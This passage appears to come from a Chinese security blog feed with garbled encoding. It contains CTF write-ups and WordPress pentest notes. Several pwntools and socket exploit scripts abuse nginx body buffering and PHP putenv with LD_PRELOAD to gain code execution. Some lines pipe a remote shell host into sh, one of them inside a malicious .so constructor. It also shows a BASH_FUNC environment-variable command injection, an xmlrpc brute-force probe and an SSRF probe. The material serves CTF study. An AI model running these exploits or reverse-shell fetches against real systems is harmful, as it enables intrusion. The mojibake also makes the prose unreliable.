h1xa# @Date:   2022-04-28 22:35:19# @Last Modified by:   h1xa# @Last Modified time: 2022-04-29 00:23:30# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.comfrom pwn import *import timeimport threadinghost &#x3D; &quot;pwn.challenge.ctf.show&quot;port &#x3D; 28166#åå¼¹shellåœ°å€å’Œç«¯å£your_shell&#x3D;&#39;https:&#x2F;&#x2F;your-shell.com&#x2F;IPåœ°å€:ç«¯å£&#39;#context.log_level &#x3D; &#39;debug&#39;def writeBuff():url &#x3D; remote(host,port)payload &#x3D; &#39;curl &#39;+your_shell+&#39; |sh &amp;&amp; echo &#39;+&#39;A&#39;*16*1024send &#x3D; &#39;&#39;&#39;GET &#x2F;index.php HTTP&#x2F;1.1\rHost:&#123;host&#125;:&#123;port&#125;\rContent-Length:&#123;length&#125;\r\r&#123;data&#125;&#39;&#39;&#39;.format(host&#x3D;host,port&#x3D;port,length&#x3D;len(payload)*2,data&#x3D;payload)url.send(send)time.sleep(60)url.close()log.success(&quot;writeBuff done&quot;)exit()def readBuff(pid,fd):url &#x3D; remote(host,port)send &#x3D; &#39;&#39;&#39;GET &#x2F;index.php?file&#x3D;&#x2F;proc&#x2F;&#123;pid&#125;&#x2F;fd&#x2F;&#123;fd&#125; HTTP&#x2F;1.1\rHost:&#123;host&#125;:&#123;port&#125;\r\r&#39;&#39;&#39;.format(host&#x3D;host,port&#x3D;port,fd&#x3D;fd,pid&#x3D;pid)url.send(send)url.close()def forceBuff(pid):for j in range(10,15):log.info(f&quot;readBuff(&#123;pid&#125;,&#123;j&#125;)&quot;)readBuff(pid,j)def run():wb &#x3D; threading.Thread(target&#x3D;writeBuff)wb.start()time.sleep(3)log.progress(&quot;writeBuff thread starting...&quot;)forceBuff(117)log.progress(f&quot;readBuff thread starting...&quot;)log.success(&quot;execute done&quot;)exit()def main():run()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å§¿åŠ¿ä¸‰-åˆ©ç”¨nginxçš„fastcgiçš„ä¸´æ—¶æ–‡ä»¶"><a href="#å§¿åŠ¿ä¸‰-åˆ©ç”¨nginxçš„fastcgiçš„ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="å§¿åŠ¿ä¸‰ åˆ©ç”¨nginxçš„fastcgiçš„ä¸´æ—¶æ–‡ä»¶"></a>å§¿åŠ¿ä¸‰ åˆ©ç”¨nginxçš„fastcgiçš„ä¸´æ—¶æ–‡ä»¶</h4><p>å’Œå§¿åŠ¿äºŒå¤§åŒå°å¼‚ï¼ŒåŒºåˆ«å°±æ˜¯<strong>åå‘ç¼“å­˜</strong>ã€‚å³å½“php-fpmè¿”å›å¤„ç†åçš„è¾ƒå¤§æ•°æ®æ—¶ï¼Œè¶…è¿‡nginxçš„ç¼“å†²åŒºå¤§å°çš„æ—¶å€™ï¼Œå°±ä¼šä¿å­˜æ–‡ä»¶ã€‚  </p><p>jokerå¸ˆå‚…è¯´æ¡ä»¶åˆ©ç”¨è‹›åˆ»ï¼Œæ‰€ä»¥æ²¡è®²ã€‚</p><h4 id="å§¿åŠ¿å››-åˆ©ç”¨nginxçš„bodyç¼“å­˜é…åˆLD-PRELOADæ‰§è¡Œæ¶æ„soæ–‡ä»¶ï¼ˆwebå…¥é—¨-818ï¼‰"><a href="#å§¿åŠ¿å››-åˆ©ç”¨nginxçš„bodyç¼“å­˜é…åˆLD-PRELOADæ‰§è¡Œæ¶æ„soæ–‡ä»¶ï¼ˆwebå…¥é—¨-818ï¼‰" class="headerlink" title="å§¿åŠ¿å›› åˆ©ç”¨nginxçš„bodyç¼“å­˜é…åˆLD_PRELOADæ‰§è¡Œæ¶æ„soæ–‡ä»¶ï¼ˆwebå…¥é—¨-818ï¼‰"></a>å§¿åŠ¿å›› åˆ©ç”¨nginxçš„bodyç¼“å­˜é…åˆLD_PRELOADæ‰§è¡Œæ¶æ„soæ–‡ä»¶ï¼ˆwebå…¥é—¨-818ï¼‰</h4><h5 id="é¢˜ç›®æ¼æ´æºç "><a href="#é¢˜ç›®æ¼æ´æºç " class="headerlink" title="é¢˜ç›®æ¼æ´æºç "></a>é¢˜ç›®æ¼æ´æºç </h5><pre class="line-numbers language-none"><code class="language-none">$env &#x3D; $_GET[&#39;env&#39;];if(isset($env))&#123;putenv($env);system(&quot;echo ctfshow&quot;);&#125;else&#123;system(&quot;ps aux&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œè·Ÿä¸Šé¢é‚£é¢˜å¤§åŒå°å¼‚ï¼Œä¸Šé¢çš„é¢˜ç›®æ˜¯ç›´æ¥ç¼“å­˜äº†æˆ‘ä»¬çš„shellï¼Œè€Œè¿™é¢˜æˆ‘ä»¬éœ€è¦ç›´æ¥ç¼“å­˜ä¸€ä¸ªæ¶æ„çš„soæ–‡ä»¶ã€‚  </p><h5 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h5><p>æ¶æ„çš„soæ–‡ä»¶ä½¿ç”¨ä¸Šé¢åšè¿‡çš„é¢˜ç›®ç”Ÿæˆçš„å°±è¡Œäº†ï¼Œä¹Ÿå¯ä»¥ç”¨ä¸‹é¢çš„cæ–‡ä»¶ç”Ÿæˆ</p><pre class="line-numbers language-none"><code class="language-none">#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;__attribute__ ((__constructor__)) void preload(void)&#123;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;175.178.47.228:8888 | sh&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-04-27 12:43:50# @Last Modified by:   h1xa# @Last Modified time: 2022-04-29 12:03:02# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.comfrom pwn import *import timeimport threadingimport requestshost &#x3D; &quot;pwn.challenge.ctf.show&quot;port &#x3D; 28120context.log_level &#x3D; &#39;debug&#39;def getSo():with open(&quot;exp.so&quot;,&quot;rb&quot;) as f:ret &#x3D; f.read()return retdef writeBuff():url &#x3D; remote(host,port)payload &#x3D; getSo()send &#x3D; &#39;&#39;&#39;GET &#x2F;index.php HTTP&#x2F;1.1\rHost:&#123;host&#125;:&#123;port&#125;\rContent-Length:&#123;length&#125;\r\r&#39;&#39;&#39;.format(host&#x3D;host,port&#x3D;port,length&#x3D;len(payload)*2)url.send(send)url.send(payload)time.sleep(60)url.close()log.success(&quot;writeBuff done&quot;)exit()def readBuff(pid,fd):url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;&#123;host&#125;:&#123;port&#125;&#x2F;index.php?env&#x3D;LD_PRELOAD&#x3D;&#x2F;proc&#x2F;&#123;pid&#125;&#x2F;fd&#x2F;&#123;fd&#125;&#39;&#39;&#39;.format(host&#x3D;host,port&#x3D;port,fd&#x3D;fd,pid&#x3D;pid)requests.get(url)def forceBuff(pid):for j in range(10,15):log.info(f&quot;readBuff(&#123;pid&#125;,&#123;j&#125;)&quot;)readBuff(pid,j)time.sleep(1)def run():wb &#x3D; threading.Thread(target&#x3D;writeBuff)wb.start()time.sleep(3)log.progress(&quot;writeBuff thread starting...&quot;)forceBuff(117)log.progress(f&quot;readBuff thread starting...&quot;)log.success(&quot;execute done&quot;)exit()def main():run()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¾¤ä¸»çš„è„šæœ¬ä¼¼ä¹è·‘ä¸å‡ºæ¥818ï¼Œè¿™é‡Œå€Ÿç”¨yuå¸ˆå‚…çš„è„šæœ¬ï¼Œtqlï¼</p><pre class="line-numbers language-none"><code class="language-none"># coding: utf-8import urllib.parseimport  threading, requestsimport socketimport report&#x3D; 28166s&#x3D;socket.socket()s.connect((&#39;pwn.challenge.ctf.show&#39;,port))s.send(f&#39;&#39;&#39;GET &#x2F; HTTP&#x2F;1.1Host:127.0.0.1&#39;&#39;&#39;.encode())data&#x3D;s.recv(1024).decode()s.close()pid &#x3D; re.findall(&#39;(.*?) www-data&#39;,data)[0].strip()print(pid)l&#x3D;str(len(open(&#39;exp.so&#39;,&#39;rb&#39;).read()+b&#39;\n&#39;*1024*200)).encode()def upload():while True:s&#x3D;socket.socket()s.connect((&#39;pwn.challenge.ctf.show&#39;,port))x&#x3D;b&#39;&#39;&#39;POST &#x2F; HTTP&#x2F;1.1Host: 127.0.0.1User-Agent: yu22xContent-Length: &#39;&#39;&#39;+l+b&#39;&#39;&#39;Content-Type: application&#x2F;x-www-form-urlencodedConnection: close&#39;&#39;&#39;+open(&#39;exp.so&#39;,&#39;rb&#39;).read()+b&#39;\n&#39;*1024*200+b&#39;&#39;&#39;&#39;&#39;&#39;s.send(x)s.close()def bruter():while True:for fd in range(10,16):print(fd)s&#x3D;socket.socket()s.connect((&#39;pwn.challenge.ctf.show&#39;,port))s.send(f&#39;&#39;&#39;GET &#x2F;?env&#x3D;LD_PRELOAD&#x3D;&#x2F;proc&#x2F;&#123;pid&#125;&#x2F;fd&#x2F;&#123;fd&#125; HTTP&#x2F;1.1Host: 127.0.0.1User-Agent: yu22xConnection: close&#39;&#39;&#39;.encode())print(s.recv(2048).decode())s.close()for i in range(30):    t &#x3D; threading.Thread(target&#x3D;upload)    t.start()for j in range(30):    a &#x3D; threading.Thread(target&#x3D;bruter)    a.start()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ€è·¯äºŒ-æƒ³åŠæ³•åˆ©ç”¨ç¯å¢ƒå˜é‡ï¼ˆwebå…¥é—¨-819ï¼‰"><a href="#æ€è·¯äºŒ-æƒ³åŠæ³•åˆ©ç”¨ç¯å¢ƒå˜é‡ï¼ˆwebå…¥é—¨-819ï¼‰" class="headerlink" title="æ€è·¯äºŒ æƒ³åŠæ³•åˆ©ç”¨ç¯å¢ƒå˜é‡ï¼ˆwebå…¥é—¨-819ï¼‰"></a>æ€è·¯äºŒ æƒ³åŠæ³•åˆ©ç”¨ç¯å¢ƒå˜é‡ï¼ˆwebå…¥é—¨-819ï¼‰</h4><h5 id="æ¼æ´ä»£ç -4"><a href="#æ¼æ´ä»£ç -4" class="headerlink" title="æ¼æ´ä»£ç "></a>æ¼æ´ä»£ç </h5><pre class="line-numbers language-none"><code class="language-none">$env &#x3D; $_GET[&#39;env&#39;];if(isset($env))&#123;    putenv($env);    system(&quot;whoami&quot;);&#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‰é¢çš„é¢˜ä½¿ç”¨çš„æ˜¯pwnçš„æ¨¡å¼ï¼Œè½¬å‘ç«¯å£ï¼Œè¿™é¢˜æ˜¯ä¸€ä¸ªæ­£å¸¸çš„é¡µé¢ï¼Œä¼šç»è¿‡å±‚å±‚çš„æµé‡è½¬å‘ï¼Œæ‰€ä»¥ä¸èƒ½è¿›è¡Œä¸€ä¸ªä¸´æ—¶æ–‡ä»¶çš„å†™å…¥äº†ï¼Œæ‰€ä»¥å¾—å¦å¤–è€ƒè™‘æ–°çš„æ–¹å¼ã€‚æ‰€ä»¥è¿™é‡Œä»putenvè¿™é‡Œå¼€å§‹çªç ´ã€‚  </p><h5 id="phpçš„systemå‡½æ•°"><a href="#phpçš„systemå‡½æ•°" class="headerlink" title="phpçš„systemå‡½æ•°"></a>phpçš„systemå‡½æ•°</h5><p>è·Ÿè¿›phpçš„systemçš„åº•å±‚cä»£ç å¯ä»¥çŸ¥é“ï¼Œphpé¦–å…ˆè°ƒç”¨äº†VCWD_POPENæ–¹æ³•ï¼Œåˆå®šä¹‰äº†å®ã€‚è¿™é‡Œæ˜¯è°ƒç”¨äº†glibcçš„popenå‡½æ•°ï¼Œè·Ÿè¿›glibcçš„æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°popenæ˜¯å¦‚ä½•å®ç°çš„ï¼Œçœ‹åˆ°äº†æ‰§è¡Œäº†sh -cå‘½ä»¤ï¼Œåœ¨centosä¸‹ï¼Œç”±äºshæŒ‡å‘bashï¼Œæ‰€ä»¥å°±æ˜¯æ‰§è¡Œäº†bash -cå‘½ä»¤ã€‚</p><h5 id="bashä¸ç¯å¢ƒå˜é‡"><a href="#bashä¸ç¯å¢ƒå˜é‡" class="headerlink" title="bashä¸ç¯å¢ƒå˜é‡"></a>bashä¸ç¯å¢ƒå˜é‡</h5><p>é‚£ä¹ˆå°±æ€è€ƒèƒ½å¦æ§åˆ¶bashæ‰€å¼•ç”¨çš„ç¯å¢ƒå˜é‡ï¼Œä»è€Œå®ç°ä»£ç æ‰§è¡Œã€‚bashåœ¨è®¾è®¡æ—¶ï¼Œæœ‰è¿™ä¹ˆä¸€ä¸ªåŠŸèƒ½ï¼Œå°±æ˜¯å¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡æ¥åˆå§‹åŒ–ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå¹¶ç»™ä»–å‘½åã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-none"><code class="language-none">name&#x3D;funccontent&#x3D;() &#123;:;&#125;é‚£ä¹ˆåˆèµ·æ¥ä¸ºfunc&#x3D;() &#123;:;&#125;æˆ‘ä»¬å†æŠŠè¯¥å‡½æ•°æ³¨å†Œè¿›å»ï¼Œæ€ä¹ˆæ³¨å†Œå‘¢ï¼Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯ç±»ä¼¼phpçš„evalå‡½æ•°ã€‚ç±»ä¼¼äºï¼ševal(func&#x3D;() &#123;:;&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ç ´å£³æ¼æ´"><a href="#ç ´å£³æ¼æ´" class="headerlink" title="ç ´å£³æ¼æ´"></a>ç ´å£³æ¼æ´</h5><pre class="line-numbers language-none"><code class="language-none">name&#x3D;funccontent&#x3D;hack&#x3D;() &#123;:;&#125;;idæ‰€ä»¥åˆèµ·æ¥å°±å˜ä¸ºï¼ševal(func&#x3D;hack&#x3D;() &#123;:;&#125;;id)é€šè¿‡ä¸€ä¸ªåˆ†å·ï¼Œå‰é¢çš„å‡½æ•°å®šä¹‰å®Œæ¯•ä¹‹åï¼Œéšå³å°±æ‰§è¡Œäº†åé¢çš„idæ–¹æ³•ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®˜æ–¹ä¿®å¤ï¼š</p><pre class="line-numbers language-none"><code class="language-none">è§„å®šï¼šå‡½æ•°åå¿…é¡»æœ‰å‰ç¼€å‡½æ•°ä½“å¿…é¡»æœ‰å‰ç¼€åªæ‰§è¡Œå‰ç¼€ä»¥åï¼Œåç¼€ä¹‹å‰çš„å†…å®¹å‡½æ•°ä½“å¿…é¡»ä»¥()&#123;å¼€å¤´ï¼Œå‡½æ•°åBASH_FUNC_å¼€å¤´ï¼Œå¹¶ä¸”ä»¥%%ç»“å°¾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="å†çœ‹é¢˜ç›®"><a href="#å†çœ‹é¢˜ç›®" class="headerlink" title="å†çœ‹é¢˜ç›®"></a>å†çœ‹é¢˜ç›®</h5><p>æœ‰ç ´å£³æ¼æ´çš„æ€è·¯è¿›è¡Œæ€è€ƒï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªputenvï¼Œåœ¨é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡çš„æ—¶å€™æ³¨å†Œä¸€ä¸ªå‡½æ•°ï¼Œé€šè¿‡ç§»èŠ±æ¥æœ¨å°†whoamiå‘½ä»¤è¦†ç›–ä¸ºbashå‘½ä»¤æ¥æ‰§è¡Œã€‚  </p><p>æ‰€ä»¥å¼€å§‹æ ¹æ®å®˜æ–¹çš„è§„å®šè¿›è¡Œåˆç†çš„æ„é€ ï¼š</p><pre class="line-numbers language-none"><code class="language-none">BASH_FUNC_whoami%%&#x3D;() &#123; id; &#125;?env&#x3D;BASH_FUNC_whoami%%&#x3D;() &#123; id; &#125;ä¼ ç»™envï¼Œç›´æ¥æ‰§è¡ŒæˆåŠŸï¼ï¼ï¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„ï¼š</p><pre class="line-numbers language-none"><code class="language-none">å¦‚æœubuntuçš„shæŒ‡å‘dshï¼Œalpineçš„shæŒ‡å‘ashï¼Œé‚£ä¹ˆä¸Šé¢çš„å§¿åŠ¿æ˜¯æ— æ³•åˆ©ç”¨çš„ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æ— ä¸Šä¼ ç‚¹æ€»ç»“"><a href="#æ— ä¸Šä¼ ç‚¹æ€»ç»“" class="headerlink" title="æ— ä¸Šä¼ ç‚¹æ€»ç»“"></a>æ— ä¸Šä¼ ç‚¹æ€»ç»“</h3><p>èƒ½å¤Ÿæ§åˆ¶ç¯å¢ƒå˜é‡ï¼Œä½†æ˜¯æ— æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œå¯ä»¥åˆ©ç”¨çš„å¤šç§å§¿åŠ¿å¦‚ä¸‹ï¼š  </p><p>1ã€åˆ©ç”¨phpçš„$_FILESæœºåˆ¶ï¼Œä½¿ç”¨ä¸´æ—¶æ–‡ä»¶æ³¨å…¥æ¶æ„çš„soæ–‡ä»¶ã€‚  </p><p>2ã€åˆ©ç”¨nginxçš„bodyç¼“å­˜æœºåˆ¶ï¼Œä¸€æ˜¯ç›´æ¥ä¼ shellï¼Œå¦å¤–ä¸€ä¸ªæ˜¯ä¼ æ¶æ„soã€‚  </p><p>3ã€åˆ©ç”¨nginxçš„fastcgiç¼“å­˜ã€‚ï¼ˆjokerå¸ˆå‚…æ²¡è®²  </p><p>4ã€åˆ©ç”¨bashçš„ç¯å¢ƒå˜é‡æ³¨å†ŒåŒ¿åå‡½æ•°ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wordpressåˆ†æ</title>
      <link href="/2022/04/24/wordpress-fen-xi/"/>
      <url>/2022/04/24/wordpress-fen-xi/</url>
      
        <content type="html"><![CDATA[<h3 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h3><p>wordpresså­¦ä¹ ä¿¡æ¯ä¸»è¦æ¥è‡ª<a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#basic-information">HackTricks</a></p><h3 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><p>Themes files can be found in<code>/wp-content/themes/</code></p><p>For example: Using <strong>theme twentytwelve</strong> you can <strong>access</strong> the <strong>404.php</strong> file in**:** <strong>&#x2F;wp-content&#x2F;themes&#x2F;twentytwelve&#x2F;404.php</strong></p><p>Another useful url could be: <strong>&#x2F;wp-content&#x2F;themes&#x2F;default&#x2F;404.php</strong></p><p>In <strong>wp-config.php</strong> you can find the root password of the database.</p><p>Default login paths to check: *** &#x2F;wp-login.php, &#x2F;wp-login&#x2F;, &#x2F;wp-admin&#x2F;, &#x2F;wp-admin.php, &#x2F;login&#x2F;\ ***</p><h3 id="ä¸»è¦æ–‡ä»¶"><a href="#ä¸»è¦æ–‡ä»¶" class="headerlink" title="ä¸»è¦æ–‡ä»¶"></a>ä¸»è¦æ–‡ä»¶</h3><p><code>index.php,license.txt</code></p><p><code>wp-activate.php</code> is used for the email activation process when setting up a new WordPress site.</p><pre class="line-numbers language-none"><code class="language-none">Login folders:&#x2F;wp-admin&#x2F;login.php&#x2F;wp-admin&#x2F;wp-login.php&#x2F;login.php&#x2F;wp-login.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>xmlrpc.php</code>ï¼ˆä¸€ä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨HTTPç›¸åº”ç çŸ¥è¯†APIé”™è¯¯ï¼‰</p><p>is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress <a href="https://developer.wordpress.org/rest-api/reference">REST API</a>.</p><p>The <code>wp-content</code> folder is the main directory where plugins and themes are stored.</p><p><code>wp-content/uploads/</code> Is the directory where any files uploaded to the platform are stored.</p><p><code>wp-includes/</code> This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.</p><p>The <code>wp-config.php</code> file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.</p><h3 id="Passive-enumeration"><a href="#Passive-enumeration" class="headerlink" title="Passive enumeration"></a>Passive enumeration</h3><pre class="line-numbers language-none"><code class="language-none">Get Pluginscurl -s -X GET https:&#x2F;&#x2F;wordpress.org&#x2F;support&#x2F;article&#x2F;pages&#x2F; | grep -E &#39;wp-content&#x2F;plugins&#x2F;&#39; | sed -E &#39;s,href&#x3D;|src&#x3D;,THIIIIS,g&#39; | awk -F &quot;THIIIIS&quot; &#39;&#123;print $2&#125;&#39; | cut -d &quot;&#39;&quot; -f2Get Themescurl -s -X GET https:&#x2F;&#x2F;wordpress.org&#x2F;support&#x2F;article&#x2F;pages&#x2F; | grep -E &#39;wp-content&#x2F;themes&#39; | sed -E &#39;s,href&#x3D;|src&#x3D;,THIIIIS,g&#39; | awk -F &quot;THIIIIS&quot; &#39;&#123;print $2&#125;&#39; | cut -d &quot;&#39;&quot; -f2Extract versions in generalcurl -s -X GET https:&#x2F;&#x2F;wordpress.org&#x2F;support&#x2F;article&#x2F;pages&#x2F; | grep http | grep -E &#39;?ver&#x3D;&#39; | sed -E &#39;s,href&#x3D;|src&#x3D;,THIIIIS,g&#39; | awk -F &quot;THIIIIS&quot; &#39;&#123;print $2&#125;&#39; | cut -d &quot;&#39;&quot; -f2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Active-enumeration"><a href="#Active-enumeration" class="headerlink" title="Active enumeration"></a>Active enumeration</h3><h4 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h4><pre class="line-numbers language-none"><code class="language-none">curl -s -I -X GET http:&#x2F;&#x2F;blog.example.com&#x2F;?author&#x3D;1curl http:&#x2F;&#x2F;blog.example.com&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="XML-RPC"><a href="#XML-RPC" class="headerlink" title="XML-RPC"></a>XML-RPC</h4><p>If <code>xml-rpc.php</code> is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (You can automate this process<a href="https://github.com/relarizky/wpxploit"> using this</a> for example).</p><p>To see if it is active try to access to <strong><code>/xmlrpc.php</code></strong> and send(POST) this request:</p><pre class="line-numbers language-none"><code class="language-none">&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;param&gt;&lt;value&gt;pass&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;YOUR SERVER &gt;:&lt;port&gt;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;SOME VALID BLOG FROM THE SITE &gt;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="x2F-wp-json-x2F-oembed-x2F-1-0-x2F-proxy-SSRF"><a href="#x2F-wp-json-x2F-oembed-x2F-1-0-x2F-proxy-SSRF" class="headerlink" title="&#x2F;wp-json&#x2F;oembed&#x2F;1.0&#x2F;proxy - SSRF"></a>&#x2F;wp-json&#x2F;oembed&#x2F;1.0&#x2F;proxy - SSRF</h3><p>Try to access <em><code>https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net</code></em> and the Worpress site may make a request to you.</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wordpress </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-24186å¤ç°</title>
      <link href="/2022/04/05/cve-2020-24186-fu-xian/"/>
      <url>/2022/04/05/cve-2020-24186-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="WordPressè¯„è®ºæ’ä»¶wpDiscuzä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#WordPressè¯„è®ºæ’ä»¶wpDiscuzä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="WordPressè¯„è®ºæ’ä»¶wpDiscuzä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>WordPressè¯„è®ºæ’ä»¶wpDiscuzä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</h1><h2 id="CVE-2020-24186"><a href="#CVE-2020-24186" class="headerlink" title="CVE-2020-24186"></a>CVE-2020-24186</h2><h2 id="äº§å“ä»‹ç»"><a href="#äº§å“ä»‹ç»" class="headerlink" title="äº§å“ä»‹ç»"></a>äº§å“ä»‹ç»</h2><p>WordPressæ˜¯ä¸€æ¬¾èƒ½å»ºç«‹å‡ºè‰²ç½‘ç«™ã€åšå®¢æˆ–åº”ç”¨ç¨‹åºçš„å¼€æºè½¯ä»¶ã€‚wpDiscuzæ˜¯wordpressçš„ä¸€æ¬¾åˆ›æ–°ï¼Œç°ä»£ä¸”åŠŸèƒ½ä¸°å¯Œçš„è¯„è®ºæ’ä»¶ï¼Œå¯å……å®ä½¿ç”¨wordpressæ‰€å»ºç«‹çš„ç½‘ç«™è¯„è®ºéƒ¨åˆ†ã€‚</p><h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h2><h3 id="æ¼æ´å±å®³ï¼š"><a href="#æ¼æ´å±å®³ï¼š" class="headerlink" title="æ¼æ´å±å®³ï¼š"></a>æ¼æ´å±å®³ï¼š</h3><p>wpDiscuzæ’ä»¶å­˜åœ¨é«˜å±æ¼æ´ï¼Œæ­¤æ¼æ´å…è®¸æœªç»éªŒè¯çš„æ”»å‡»è€…åœ¨ç›®æ ‡ç«™ç‚¹ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼ŒåŒ…æ‹¬phpæ–‡ä»¶ï¼Œå¯ä»¥å®ç°è¿œç¨‹ä»£ç 